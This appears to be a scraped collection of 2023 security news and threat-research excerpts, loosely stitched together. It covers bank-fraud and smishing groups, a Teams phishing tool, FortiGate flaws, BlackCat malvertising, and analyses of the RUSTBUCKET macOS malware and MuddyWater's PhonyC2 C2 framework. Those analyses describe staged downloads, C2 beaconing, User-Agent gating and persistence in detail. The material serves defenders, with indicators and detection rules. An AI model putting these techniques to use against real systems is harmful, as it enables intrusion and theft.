typically focus on operator accounts that control significant sums of money, using stolen credentials to transfer funds into Channel User accounts before ultimately redirecting them to subscriber accounts under their control. The group withdraws the stolen money as cash through an extensive network of ATMs over holidays or weekends to avoid detection.\"The success of Operation Nervone exemplifies the importance of threat data exchange, and thanks to our collaboration with INTERPOL, Orange-CERT-CC and private and public sector partners, we were collectively able to piece together the whole puzzle.\""

      "text": " UK / EMEA News Reporter, Infosecurity MagazineDozens of the UK’s leading experts on security and privacy have raised grave concerns with Online Safety Bill provisions which call for the monitoring of end-to-end encrypted messages for child sexual exploitation and abuse (CSEA) content.Doing so would either require an encryption backdoor or “client-side scanning,” whereby users are forced to download software that monitors all their messages for CSEA material against a database of known illegal content, before they’re encrypted.“Our concern is that surveillance technologies are deployed in the spirit of providing online safety. This act undermines privacy guarantees and, indeed, safety online,” argued the experts.“Such monitoring is categorically incompatible with maintaining today’s (and internationally adopted) online communication protocols that offer privacy guarantees similar to face-to-face conversations. Secondly, attempts to sidestep this contradiction are doomed to fail on the technological and likely societal level.”They argued that it would be impossible to provide a system for access to encrypted content for just the government, which would not ultimately be exposed to future government overreach or “any adversary who compromises the monitoring infrastructure.”The problem with client-side scanning, they continued, is that current algorithms are not very effective at detecting prohibited content, raising the prospect of damaging false positives. Any scanning software could also be repurposed in the future to peer further into people’s lives, they warned.“This would leave UK residents in a vulnerable situation, having to adopt compromised and weak solutions for online interactions.”With Labour backing the bill, it’s likely to make it into law – but it’s hoped that politicians will listen to the experts this time and amend Clause 110."

      "text": " Deputy Editor, Infosecurity MagazineOver half (56%) of UK citizens do not trust the NHS to use AI to analyze patient data due to security and privacy concerns, according to research by VMware.In addition, a quarter (25%) of the more than 2000 respondents to the VMware survey said they are completely against the NHS using AI to process their patient data.Dr Will Venters, Associate Professor of Information Systems, London School of Economics, told Infosecurity that the findings show that social as well as technical and legal barriers to the use of AI in the NHS must be overcome before the healthcare benefits of these technologies can be fully realized.“We need patients to accept its use. Back in 2016 there was considerable controversy from Google’s DeepMind relationship and the Royal Free London NHS Trust’s sharing of data from 1.6 million patients. Avoiding such controversy and political backlash should be part of the overall security and privacy strategy for sustainable AI,” he explained.Guy Bartram, Cloud Evangelist EMEA, VMware, added that education and transparency around how AI is used and its benefits should be a priority.“People need educating in what new technologies like AI will be doing with their data and the NHS could go far by openly discussing and advertising their solutions and how they ensure national citizen data security is maintained, not doing so leaves room for doubt and will not gain trust,” he commented.Despite the concerns, 45% of the respondents to the VMware research said they were open to the NHS using AI to improve services, and 44% were happy with these technologies to be used in processing patient data if it helped to process diagnostic tests faster.The study also found that 87% of UK consumers believe it is important their NHS patient data is stored in the UK. Of these respondents, 39% think that this data being held within the country’s national borders will ensure it complies with UK data privacy regulations.Over a fifth (22%) said they do not trust other countries to safeguard their data as well as the UK does, while 21% believe this information will be less likely to be exposed to foreign cyber threats or accessed by foreign entities.In the report, VMware highlighted that many UK NHS and social care providers use public cloud services, which means that patient data is currently hosted either within the UK, the European Economic Area (EEA) or a country deemed adequate by the UK.Overall, the majority (59%) of consumers expressed confidence in the NHS’s ability to safeguard their sensitive information.Venters expressed surprise at the strength of opposition to NHS data leaving the UK, but acknowledged that the strength of feeling around UK sovereignty should be reflected in the institution’s data practices.He said: “As Nigel Lawson once said ‘the National Health Service is the closest thing the English have to a religion’ – people tend to trust it. Maintaining that trust over the decades to come requires robust and patient centric approaches to data management and security.”Bartram commented that the findings show the importance of the NHS and other critical sectors demonstrating data sovereignty to build consumer trust with patient data. He said this can be achieved by ensuring more data is stored in a sovereign cloud, which ensures all data, including metadata, is held within the local jurisdiction.“The NHS, and any other verticalized industry, needs to make careful choices about where their data is resident, under whose jurisdiction, how and particularly what is processed. Processing or storing any data that is confidential or has privacy legislation regarding the data and meta data, should be subject only to the jurisdictional laws of which its owner pertains,” he told Infosecurity.The research was published on July 5, 2023, the 75th anniversary of the UK’s National Health Service (NHS)."

      "text": " Freelance JournalistA new malicious campaign relying on email attacks has been discovered targeting the most popular forms of cryptocurrency storage: hot and cold wallets.“We are witnessing an ongoing surge in the popularity of cryptocurrencies, and with it, the need for users to stay alert and implement strong security measures to protect their digital assets,” commented Roman Dedenok, a security expert at Kaspersky.These online storage services, including crypto exchanges and dedicated apps, have become prime targets for cyber-criminals due to their constant internet connectivity. Phishing attacks on hot wallet users typically employ simple tactics, preying on non-technical individuals. Scammers impersonate well-known crypto exchanges through fraudulent emails, urging users to verify transactions or confirm the security of their wallets. In contrast, cold wallets are entirely offline storage systems, such as dedicated devices or private keys written on paper.Instead of directing victims to a phishing page, scammers create a deceptive blog post that mimics the design of the Ripple website. The blog allows users to enter the token giveaway by following a specified link. Victims who follow the link are directed to a fake Ripple page with a domain name closely resembling the official Ripple domain, using a Punycode phishing attack. They are then prompted to connect their hardware wallets enabling scammers to access their accounts and initiate fraudulent transactions."

      "text": " A new tool is available on GitHub that gives attackers a way to leverage a recently disclosed vulnerability in Microsoft Teams and automatically deliver malicious files to targeted Teams users in an organization.\"Give TeamsPhisher an attachment, a message, and a list of target Teams users,\" said the tool's developer Alex Reid, a member of the US Navy's Red Team, in a description of the tool on GitHub. \"It will upload the attachment to the sender's Sharepoint and then iterate through the list of targets.\"Corbridge and Ellson found they could exploit an IDOR issue in Teams simply by switching the ID of the internal and external recipient when submitting a POST request. The two researchers discovered that when a payload is sent in this manner, the payload is hosted on the sender's SharePoint domain and arrives in the victim's Team's inbox. Corbridge and Ellson identified the vulnerability as affecting every organization running Teams in a default configuration and described it as something an attacker could use to bypass anti-phishing mechanisms and other security controls. Microsoft acknowledged the issue but assessed it as something not deserving of an immediate fix.According to Reid, the way TeamsPhisher works is to first enumerate a target Teams user and verify that the user can receive external messages. TeamsPhisher then creates a new thread with the target user. It uses a technique that allows the message to arrive in the target's inbox without the usual \"Someone outside your organization messaged you, are you sure you want to view it\" splash screen, Reid said. \"With the new thread created between our sender and the target, the specified message will be sent to the user along with a link to the attachment in Sharepoint,\" he noted. \"Once this initial message has been sent, the created thread will be visible in the sender's Teams GUI and can be interacted with manually, if need be, on a case-by-case basis.\"Microsoft said it is aware of TeamsPhiser and has determined that the tool relies on social engineering to be successful. \"We encourage customers to practice good computing habits online, including exercising caution when clicking on links to web pages, opening unknown files, or accepting file transfers,\" the company said in an emailed statement.JUMPSEC itself has urged organizations using Microsoft Teams to review whether there is any business need for enabling communications between internal Teams users and external tenants. \"If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether,\" the company has advised.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

It's also theoretically possible, though, that \"the attacker is able to leverage control of the compromised monitoring system to do greater damage or get deeper into the environment.\"VulnCheck noted that these two endpoints, like confi_mail.php, \"appear to generate hits from malicious hosts on GreyNoise meaning that they too are likely under some level of active exploitation.\"All three vulnerabilities were assigned \"critical\" 9.8 (out of 10) CVSS scores.Only Internet-exposed instances of SolarView are at risk of remote compromise. A quick Shodan search by VulnCheck revealed 615 cases connected to the open Web as of this month.Operators might risk remaining online if, at least, their systems are patched. Remarkably, however, 425 of those Internet-facing SolarView systems — more than two thirds of the total — were running versions of the software lacking the necessary patch.At least when it comes to critical systems, this may be understandable. \"IoT and operational technology devices are often a lot more challenging to update compared to your typical PC or mobile device.

The threat actor uses relatively unsophisticated tools, but experts speculate that the reason behind the success of this campaign is the capability of tailoring the attack infrastructure to specific targets.It has been estimated that the threat actor has stolen over 350,000 EUR from victims’ bank accounts and compromised Personally Identifiable Information (PII) of thousands of victims.“Neo_Net has established and rented out a wide-ranging infrastructure, including phishing panels and Android trojans, to multiple affiliates, sold compromised victim data to third parties, and launched a successful Smishing-as-a-Service offering targeting various countries worldwide.”30 out of 50 targeted financial institutions are located in Spain or Chile, the list of targets includes Santander, BBVA and CaixaBank. The threat actor also targeted banks in other regions, including Deutsche Bank, Crédit Agricole and ING. Neo_Net has set up and rented out a wide-ranging infrastructure, including phishing panels, Smishing software, and Android trojans to its network of affiliates. The criminal also sold stolen victim data and has launched a successful Smishing-as-a-Service named Ankarex. The Ankarex platform was launched in May 2022 and has about 1,700 subscribers. The threat actor advertises the Smishing-as-a-Service platform on Telegram. The campaign employed a sophisticated multi-stage attack chain that commenced with SMS phishing messages distributed across Spain using Ankarex. The messages were crafted using Sender IDs (SIDs) to trick recipients into believing that they are authentic, and mimicking reputable financial institutions.“The phishing pages were meticulously set up using Neo_Net’s panels, PRIV8, and implemented multiple defense measures, including blocking requests from non-mobile user agents and concealing the pages from bots and network scanners. These pages were designed to closely resemble genuine banking applications, complete with animations to create a convincing façade” continues the report.The threat actor employed various techniques to circumvent the Multi-Factor Authentication (MFA), including social engineering to trick victims into installing a purported security application for their bank account on their Android devices.The malicious apps are used to capture SMSs containing authorization codes.“The success of their campaigns can be attributed to the highly targeted nature of their operations, often focusing on a single bank, and copying their communications to impersonate bank agents. Furthermore, due to the simplicity of SMS spyware, it can be difficult to detect, as it only requires permission to send and view SMS messages.” concludes the report that also provides indicators of compromise (IoCs) for this campaign.“Neo_Net has also been observed reusing compromised PII for further profit.”\nCopyright@securityaffairs 2023 "

      "text": " A security researcher and system administrator has developed a tool that can help users check for manifest mismatches in packages from the NPM JavaScript software registry.\"Manifest confusion\" refers to a security issue in the NPM (Node Package Manager), a package manager for the JavaScript programming language and the default one for the Node.js environment.The problem is with the inconsistent information between a package's manifest data as displayed in the NPM registry and the data present in the 'package.json' file of the published package.A malicious actor could manipulate the manifest data of a new package, eliminating certain scripts or dependencies so that they do not appear in the NPM registry.However, these scripts or dependencies would still be present in the package.json file and would be executed when the package is installed, without the user being aware.This problem potentially exposes developers to risks such as cache poisoning, installation of unknown dependencies, execution of unknown scripts, and possibly even downgrade attacks.Since GitHub has yet to address the problem and it is unclear what the platform plans to do, Clarke suggested that package maintainers remove reliance on manifest data and use a registry proxy to perform data consistency checks.To use the tool, first, install the PIP Python package manager with \"pip install -r requirements.txt.\"To inspect a single package, pass the package's name to the script as the first argument. For example:$ ./npm-manifest-check.py darcyclarke-manifest-pkgThe output will highlight any mismatches in the version, dependencies, scripts, and package name between the manifest and the actual package.json file.For a package without any mismatches, the output should look like this:$ ./npm-manifest-check.py color\nNo mismatch detected for color.To inspect multiple packages, developers can add them to a 'packages. list' file (one package per line) and use the 'check_packages.sh' wrapper script to check them. The tool will report any mismatches found on each of the checked packages.To understand all aspects of the usage of Pankratz's tool, check the help command with:./npm-manifest-check.py -hManifest confusion is not a widespread or critical problem in the NPM community right now, but ignoring it is not the safe way to go as threat actors could start using it for supply-chain attacks."

Despite the threat, a recent report has found that security leaders severely lack visibility in their OT assets.For instance, while 80% of the 350 respondents said their security operations center (SOC) has monitoring capabilities for the IT assets of their ICS – which include human-machine interfaces (HMIs), workstations and enterprise resource planning (ERP) systems – only 50% claim similar capabilities for their OT assets like programmable logic controllers (PLCs), sensors and remote terminal units (RTUs).“Even in the case where respondents had a more expansive SOC, only 53% of their OT environments provided data for detection purposes – the rest only had limited visibility that allowed them to conduct incident investigation and response,” the study reads.In addition to gaps in visibility, the study reveals that the top obstacles to improving the collaboration between security and operational teams (SecOps) in IT and OT environments are mainly related to skills and processes.Over half of the respondents (54%) cited the lack of OT training for IT staff as the main limitation for improving SecOps, while over one-third (38%) said OT staff also lacked IT training.Additionally, 39% of respondents said communication silos between departments contributed to the low level of collaboration between IT and OT leaders.Despite the issues, security leaders are aware that this visibility gap between their IT and OT environments could be critical and 67% told SANS that they had plans to expand their SOC to include additional OT asset capabilities.Additionally, 76% of security leaders using an endpoint detection and response (EDR) solution and 70% of those who benefit from network security monitoring (NSM) tools plan to deploy them on OT devices within the next two years.Findings from this study came from a survey conducted by the SANS Institute in collaboration with Trend Micro. The 350 respondents are security leaders from organizations of all sizes across various industrial sectors and located on all continents."

      "text": " Freelance JournalistSecurity researcher Pol Thill has identified a Mexico-based hacker known as Neo_Net as the mastermind behind a series of cyber-attacks targeting global banks. Neo_Net’s campaign spanned from June 2021 to April 2023, specifically focusing on prominent banks in various countries, mainly Spanish and Chilean financial institutions. Notable targets of the cyber-criminal include Santander, BBVA and CaixaBank. Despite employing relatively unsophisticated tools, Neo_Net achieved remarkable success, stealing over €350,000 ($382,153) from victims’ bank accounts and compromising the personal information of thousands of individuals.The hacker’s attack strategy revolved around deploying SMS phishing messages disguised as legitimate communications from reputable financial institutions. These carefully crafted messages deceived victims into revealing their sensitive credentials. Neo_Net also developed and distributed Android Trojans disguised as security applications, exploiting the trust of unsuspecting victims to gain access to their banking information.Thill explained that Neo_Net’s operation stands out due to his Smishing-as-a-Service platform called Ankarex, which allowed him to rent out his infrastructure to multiple affiliates. This strategy enabled the cyber-criminal to expand his reach and execute successful attacks in various countries. Moreover, Neo_Net further monetized his criminal activities by selling compromised victim data to interested third parties.“Furthermore, due to the simplicity of SMS spyware, it can be difficult to detect, as it only requires permission to send and view SMS messages.”"

The malicious code extracts the contents of the zip file to the /Users/Shared/ directory and executes a stage-two application which is also named Internal PDF Viewer.app.The second stage malware doesn’t use AppleScript, it masquerades as a legitimate Apple bundle identifier and is signed with an ad-hoc signature.The stage-two malware communicates with the C2 server to fetch the stage-three payload, which is an ad-hoc signed trojan written in the Rust language. The trojan can run on both ARM and x86 architectures.Upon executing, the malware collects system information, including the process listing, current time and whether or not it’s running within a VM.This third-stage payload allows the attacker to carry out a broad range of malicious activities on the system.The new variant discovered by Elastic Security Labs is more evasive, at the time of its discovery the malicious code was undetected by VirusTotal, and has improved capabilities to maintain persistence.The analysis of the attack chain for the new variant revealed that during Stage 1, the process starts executing an AppleScript utilizing the “/usr/bin/osascript” command. The AppleScript downloads the Stage 2 binary from the C2 using cURL. The second-stage malware is a binary compiled in Swift (.pd), it downloads the main component from the command-and-control (C2) server. The malware is a Rust binary that gathers info of the infected system (Computer name, List of active processes, Current timestamp, Installation timestamp, System boot time, and Status of all running processes within the system) and downloads and runs additional malicious code.Upon execution, the malware uses the downAndExec function to prepare a POST HTTP request and utilizes specific macOS APIs for various operations. The threat actor behind the malware, tracked by Elastic Security Labs as REF9135, targeted a cryptocurrency company providing services to businesses such as payroll and business-to-business transactions. The profile of the victim is aligned with the one of organizations targeted by the North Korea-linked BlueNorOff APT group.The report includes indicators of compromise and the Yara rule for the detection of the threat.\nCopyright@securityaffairs 2023 "

      "text": " HTML smuggling is a highly evasive technique for malware delivery that leverages legitimate HTML5 and JavaScript features. The malicious payloads are delivered via encoded strings in an HTML attachment or webpage. The malicious HTML code is generated within the browser on the target device which is already inside the security perimeter of the victim’s network.The campaign targeted government entities in Europe, with a focus on foreign and domestic policy entities.Threat actors used spear-phishing messages crafted to trick recipients into downloading either a JavaScript or a ZIP file. Opening these malicious HTML documents the embedded payload within the code is decoded and saved to a JavaScript blob. The researchers noticed that instead of utilizing the HTML element, the JavaScript code dynamically creates it.The malicious code uses the createObjectURL function to create a URL object from the blob and sets the download attribute with the desired filename. Then the malicious code invokes the click action to simulate a user clicking on the link and starts the download of the file.The researchers noticed that for older browser versions, the malicious code uses the msSaveOrOpenBlob to save the blob with the desired filename.The analysis of the documents employed in the campaign that were uploaded to VirusTotal reveals that they the Chinese APT group attempted to target diplomats and government entities in Czechia, Hungary, Slovakia, the U.K., and Ukraine. Additional countries referenced in lure documents are France and Sweden.The lures uploaded to VirusTotal include:The state-sponsored hackers used a multi-stage infection process that relies on DLL side-loading methods to deliver the PlugX RAT.“One notable change we saw in this campaign’s samples is the increasing use of the RC4 encryption method compared to the simple XOR decryption we have seen in the past. The encrypted config still resides in the data section, but it has the key prepended at the start of the config and not in the decryption function like in previous samples.” concludes the report. “During the course of our investigating the samples, the threat actor dispatched a batch script, sent from the C&C server, intended to erase any trace of their activities. This script, named del_RoboTask Update.bat, eradicates the legitimate executable, the PlugX loader DLL, and the registry key implemented for persistence, and ultimately deletes itself. It is likely this is the result of the threat actors becoming aware they were under scrutiny.”The researchers pointed out that the attribution is based on similarities with activity attributed to RedDelta or Mustang Panda, including the infrastructure, the paths used to deploy PlugX, and the victimology and lure tactics.Checkpoint shared indicators of compromise (IoCs) for this campaign\nCopyright@securityaffairs 2023 "

They achieved this by searching for appliances that returned a specific HTTP response header.They filtered the results to those that redirected to ‘/remote/login,’ a clear indication of an exposed SSL VPN interface.The query above showed 489,337 devices but not all of them were vulnerable to CVE-2023-27997, also referred to as Xortigate. Investigating further, the researchers discovered that 153,414 of the discovered appliances had been updated to a safe FortiOS version.This means that roughly 335,900 of the FortiGate firewalls reachable over the web are vulnerable to attacks, a number that is significantly higher than the 250,000 recent estimation based on other, less accurate queries, Bishop Fox researchers say.These devices are vulnerable to several critical-severity flaws that have proof-of-concept exploit code publicly available.To demonstrate that CVE-2023-27997 can be used to execute code remotely on vulnerable devices, Bishop Fox created an exploit that allows \"smashes the heap, connects back to an attacker-controlled server, downloads a BusyBox binary, and opens an interactive shell.\""

This suggests the threat actors have either fully pivoted to proxyjacking or used it for an additional passive income.\"Proxyjacking has become the newest way for cybercriminals to make money from compromised devices in both a corporate ecosystem as well as the consumer ecosystem,\" West said.\"It is a stealthier alternative to cryptojacking and has serious implications that can increase the headaches that proxied Layer 7 attacks already serve.\""

      "text": " The BlackCat ransomware group (aka ALPHV) is running malvertizing campaigns to lure people into fake pages that mimic the official website of the WinSCP file-transfer application for Windows but instead push malware-ridden installers.BlackCat is using the program as a lure to potentially infect the computers of system administrators, web admins, and IT professionals for initial access to valuable corporate networks.The BlackCat attack observed by Trend Micro begins with the victim searching for \"WinSCP Download\" on Bing or Google and getting promoted malicious results ranked above the safe WinSCP download sites.The victims click on those ads and visit a website that hosts tutorials about performing automated file transfers using WinSCP.These sites contain nothing malicious, likely to evade detection by Google's anti-abuse crawlers but redirect the visitors to a clone of the WinSCP official website featuring a download button. These clones utilize domain names similar to the real winscp.net domain for the utility, such as winsccp[.]com.The victim clicks the button and receives an ISO file containing \"setup.exe\" and \"msi.dll,\" the first being the lure for the user to launch and the second being the malware dropper triggered by the executable.\"Once setup.exe is executed, it will call the msi.dll that will later extract a Python folder from the DLL RCDATA section as a real installer for WinSCP to be installed on the machine,\" explains the Trend Micro report.This process also installs a trojanized python310.dll and creates a persistence mechanism by making a run key named \"Python\" and the value \"C:\\Users\\Public\\Music\\python\\pythonw.exe\".The executable pythonw.exe loads a modified obfuscated python310.dll that contains a Cobalt Strike beacon that connects to a command-and-control server address.Having Cobalt Strike running on the system, it is easy to execute additional scripts, fetch tools for lateral movement, and generally deepen the compromise.Trend Micro's analysts noticed that ALPHV operators used the following tools in the subsequent phases:Along with the above tools, ALPHV also used the SpyBoy \"Terminator,\" an EDR and antivirus disabler sold by threat actors on Russian-speaking hacking forums for as much as $3,000.Trend Micro says it has linked the above TTPs to confirmed ALPHV ransomware infections. It also found a Clop ransomware file in one of the investigated C2 domains, so the threat actor may be affiliated with multiple ransomware operations."

      "text": " Forget crypto spam accounts, Twitter's got another problem which involves bots and accounts promoting adult content and infiltrating Direct Messages and interactions on the platform. And there doesn't seem to be an easy solution in sight.While the problem has existed for while, the uptick in porn bots is ironic, given Elon Musk's promising claims of tackling bots and fake accounts on Twitter, after his acquisition of the platform.This week, security researchers flagged many spam accounts that started following them or initiating unsolicited direct message conversations or interactions (such as likes and replies).One such Twitter account with illicit links in its bio is shown below. The account has since been suspended:Although Twitter has been suspending bot accounts as these spring up, the platform has still not enforced any effective or novel solution to contain spam and bots, making it akin to a whack-a-mole situation.But, at this point, bots continue to be a major problem for Twitter with no solution in sight.Without implementing a streamlined process for keeping fake accounts and bots at bay, Twitter's existing spam problems are here to stay."

Public key is hardcoded in the ransomware binary and differs per sample.”The ransomware appends .akira extension to the encrypted files and drops a ransom note named akira_readme.txt in each folder.The list of similarities includes:Victims have to provide a pair of files, one encrypted by the Akira ransomware and its original files“On the following page, you need to supply an example of a file in its original form and then one encrypted by Akira ransomware. Type both names of the files. You can also drag & drop files from Windows Explorer to the wizard page.” states Avast. “It is extremely important to pick a pair of files that are as big as you can find. Due to Akira’s block size calculation, there may be dramatic difference on the size limit even for files that differ by a size of 1 byte.”The decryptor also supports the option to back up encrypted files, which is recommended by the security firm.Avast is working to create a decryptor for the Linux variant, meantime it has released IOCs (indicators of compromise) for both Windows and Linux variants.\nCopyright@securityaffairs 2023 "

Elastic Defend behavioral and prebuilt detection rules provide protection and visibility for users. We have also released a signature to prevent this malware execution.The research into REF9135 used host, binary, and network analysis to identify and attribute intrusions observed by this research team, and other intelligence groups, with high confidence to the Lazarus Group; a cybercrime and espionage organization operated by the Democratic People’s Republic of North Korea (DPRK).This research will describe:Our research has identified a persistence capability not previously seen in the RUSTBUCKET family of malware, leading us to believe that this family is under active development. Additionally, at the time of publication, this new variant has zero detections on VirusTotal and is leveraging a dynamic network infrastructure methodology for command and control.The Stage 2 binary (.pd) is compiled in Swift and operates based on command-line arguments. The binary expects a C2 URL to be provided as the first parameter when executed. Upon execution, it invokes the downAndExec function, which is responsible for preparing a POST HTTP request. To initiate this request, the binary sets the User-Agent string as mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0) and includes the string pw in the body of the HTTP request.The malware initiates its operations by dynamically generating a 16-byte random value at runtime. This value serves as a distinctive identifier for the specific instance of the active malware. Subsequently, the malware proceeds to gather comprehensive system information, including:The malware establishes its initial connection to the C2 server by transmitting the gathered data via a POST request. The request is accompanied by a User-Agent string formatted as Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0).Upon receiving the request, the C2 server responds with a command ID, which serves as an instruction for the malware. The malware is designed to handle only two commands.This command directs the malware to self-terminate.This command enables the operator to upload malicious Mach-O binaries or shell scripts to the system and execute them. The payload is stored in a randomly generated temporary path and created within the current user TMP directory following the naming convention of $TMPDIR/.<8 random digits>Below is a summary of the command structure, indicating the constants, arguments, and payload components for easy comprehension.The malware proceeds by granting execution permissions to the uploaded file using the chmod API.After executing the payload, the malware sends a status update to the server, notifying it of the completed execution, and then sleeps for 60 seconds. Following this delay, the malware loops to collect system information once again and remains in a waiting state, anticipating the arrival of the next command from the serverUsing code similarities from the sample in our telemetry, we searched VirusTotal and identified an undetected variant of RUSTBUCKET. A predominant method utilized by malware to achieve persistence on macOS is through the utilization of LaunchAgents. In macOS, users have individual LaunchAgents folders within their Library directory, enabling them to define code that executes upon each user login. Additionally, a system-level LaunchAgents folder exists, capable of executing code for all users during the login process. Elastic Defend monitors for the creation of LaunchAgents and LaunchDaemons containing malicious or suspicious values as a way to detect these persistence techniques.In the case of this updated RUSTBUCKET sample, it establishes its own persistence by adding a plist file at the path /Users/<user>/Library/LaunchAgents/com.apple.systemupdate.plist, and it copies the malware’s binary to the following path /Users/<user>/Library/Metadata/System Update.There are several elements of the plist file, using standard true/false or string values:Further connecting webhostwatto.work[.]gd to DangerousPassword, BlueNorOff, and the DPRK campaigns, this domain shares a TLS leaf certificate fingerprint hash (1031871a8bb920033af87078e4a418ebd30a5d06152cd3c2c257aecdf8203ce6) with another domain, companydeck[.]online.DangerousPassword and BlueNorOff are campaigns that have both been previously associated with the DPRK.Using the IP address (64.44.141[.]15) for our initial C2 domain, crypto.hondchain[.]com, we uncovered 3 additional C2 domains:While there are only 5 hosts (4 total domains) registered to the C2 IP address (indicating that this was not a high-capacity hosting server), we looked for additional relationships to increase the association confidence between the domains. To do this, we replicated the same fingerprinting process previously used with webhostwatto.work[.]gd. The TLS fingerprint hash for starbucls[.]xyz (788261d948177acfcfeb1f839053c8ee9f325bd6fb3f07637a7465acdbbef76a) is the same fingerprint as jaicvc[.]com. With these two domains having the same TLS fingerprint hash and the fact that they were both registered to the IP address, we were able to cluster these atomic entities, and their siblings, together with high confidence:Looking at the “First” column (when they were first observed through 3rd party passive DNS), these hosts are being created rapidly, likely as an attempt to stay ahead of detection efforts by research teams. We are associating the following domains and IP address to the REF9135 campaign with high confidence:We have not observed docsend.linkpc[.]net being used with the RUSTBUCKET samples we analyzed. However, its shared IP registration and host siblings lead us to state with a moderate degree of confidence that it is directly related to RUSTBUCKET and REF9135 as C2 infrastructure; and a high degree of confidence that it is malicious (shared infrastructure as part of other campaigns).The campaign owners used techniques to hinder the collection of Stage 2 and Stage 3 binaries by analysts who may have overlooked User-Agent strings in their investigations, as well as internet scanners and sandboxes focused on collecting malicious binaries.As outlined in the Stage 1 section, there is a specific User-Agent string (cur1-agent) that is expected when downloading the Stage 2 binary, if you do not use the expected User-Agent, you will be provided with a 405 HTTP response status code (Method Not Allowed).It also appears that the campaign owners are monitoring their payload staging infrastructure. Using the expected User-Agent for the Stage 3 binary download (mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)), we were able to collect the Stage 3 binary. Finally, we observed REF9135 changing its C2 domain once we began to collect the Stage 2 and 3 binaries for analysis.  When making subsequent requests to the original server (crypto.hondchain[.]com), we received a 404 HTTP response status code (Not Found) and shortly after, a new C2 server was identified (starbucls[.]xyz). This could be because we caught the binary before it was rolled off as part of a normal operational security practice (don’t leave your valuable payload attached to the Internet to be discovered) or because they observed a connection to their infrastructure that was not from their targeted network.This requirement to download payloads allows the attackers to restrict distribution to only requestors who know the correct UA string. This provides strong protection against both scanning services and researchers, who would otherwise have early access to hosted malicious files for analysis and detection engineering.The REF9135 victim is a venture-backed cryptocurrency company providing services to businesses such as payroll and business-to-business transactions with a headquarters in the United States. This victim fits the mold from prior reporting on BlueNorOff targeting organizations with access to large amounts of cryptocurrency for theft.Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.The events for EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.Using the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for behaviors observed in REF9135.Suspicious Curl File Download via OsascriptSuspicious URL as argument to Self-Signed BinaryElastic Security has created YARA rules to identify this activity.

      "title": "PhonyC2: Revealing a New Malicious Command & Control Framework by MuddyWater | Deep Instinct",
      "text": " MuddyWater is continuously updating the PhonyC2 framework and changing TTPs to avoid detection, as can be seen throughout the blog and in the investigation of the leaked code of PhonyC2. MuddyWater uses social engineering as its’ primary initial access point so they can infect fully patched systems. Organizations should continue to harden systems and monitor for PowerShell activity.In April 2023, Deep Instinct’s threat research team identified three malicious PowerShell scripts that were part of an archive called PhonyC2_v6.zipNote: V6 is the name of the folder found on the server. Since this is not an official C2 framework, there is no changelog and version history. The framework has been changed over time, but we don't know the internal version numbers. Therefore, we refer to other versions by unique identifiers rather than version numbers.Note: Sicehice is an organization that automates the collection of cyber threat intelligence from over 30 sources and enables users to search against the collected IPs.There was no previous information regarding PhonyC2 and as the zip file contained the source code, we decided to analyze the code to further understand this C2 framework.Further research revealed additional connections to MuddyWater infrastructure including the ongoing PaperCut exploitation and previous attacks using earlier versions of the C2 framework.In figure 2, commands related to PhonyC2 are marked in red.The combination of the presence of known MuddyWater tools on the server and the fact that the threat actor communicated with two IP addresses known to be used by MuddyWater raised suspicion that PhonyC2 is a framework used by MuddyWater.To better understand the Phony C2 framework, we looked at the source code. As we can see in figure 2 above the first file of interest is “Please_Run_Once.py:”The script creates a unique config file where the IP address, the port that the C2 framework listens to for connections, and an extension for a decoy must be specified, as seen in line 5 in figure 4. Additionally, the script will add to the config.py file random UUIDs (Universal Unique Identifiers), which makes tracking the URLs of the C2 framework less trivial.An example of config.py file:In figure 6 the config file contains various PowerShell commands, which are different payloads that are used by the framework.The main.py file is small and starts a multi-threaded webserver and a command line listener. From this code we see that the name “PhonyC2” is used internally:The webserver.py is responsible for serving the C2 framework payloads:Figure 8 shows the remnants from previous iterations of the framework in the commented-out route names which have been replaced in this iteration of the framework with the random UUID in the config.py file (lines 13-20 in Figure 5)Commandline.py receives commands from the operator and prints the output of various actions taken by the C2:While the malicious files from Microsoft’s report are not publicly available for inspection, the combination of the IP addresses related to PhonyC2 appearing in Microsoft’s report with those file names makes a strong argument that the Phony C2 framework was used in the attack on the Technion. Additionally, the files created by the C2 framework are detected as “PowerShell/Downloader.SB,” the same detection name Microsoft used in their blog.Since both files are dynamically generated by the C2 framework, they are slightly different in each execution of the framework, therefore, blocking the hashes Microsoft provided is not exhaustive.While it might look like there are many options and outputs, the C2 is actually simple if we understand what the code does.\"payload” Command:In figure 11 we see a step-by-step explanation of what happens:PowerShell command writes the base64 decoded content to “c:\\programdata\\db.ps1”PowerShell command executes db.ps1 which in turn reads and decodes db.sqlite and executes the result in memory.Essentially, this is a one-liner to execute on a compromised host so it will beacon back to the C2.As previously mentioned, the files generated by the C2 are slightly different each time, however, the decoding logic remains mostly the same.Below is an example of db.sqlite content and a diagram explaining the decoding routine:“dropper” Command:This command creates different variants of PowerShell commands only for step (1).“Ex3cut3” Command:This command creates different variants of PowerShell commands for both step (2) and (3) combined:\"list” Command:The list command shows all the connected computers to the C2 with some associated information:\"setcommandforall” Command:This command is the most important one, as it allows the threat actor to execute the same command on all the connected computers at the same time. For example, a command that will download and execute a ransomware payload.\"use” Command:This command allows the threat actor to get a PowerShell shell on a specific computer:If the “use” command is selected, additional commands become available:\"persist” and Other Commands:Most of these additional commands are self-explanatory, the only interesting one is “persist”The “persist” command is used to generate a PowerShell code to enable the operator to gain persistence on the infected host so it will connect back to the C2 if the infected host is restarted.Additionally, when the operator executes the “persist” command it writes an encrypted payload to a pre-defined random registry path in “HKLM\\Software.” This can be partially seen in commandline.py (figure 22), as some of the values are stored in config.py.The encrypted payload is a slightly modified version of “persist_payload_2022.ps1” that triggered the entire investigation.Below is the full chain used to achieve persistence by PhonyC2:By executing “persist” on a machine connected to PhonyC2 the C2 writes encrypted payload to the registryAdd a registry key to the Windows registry that runs a 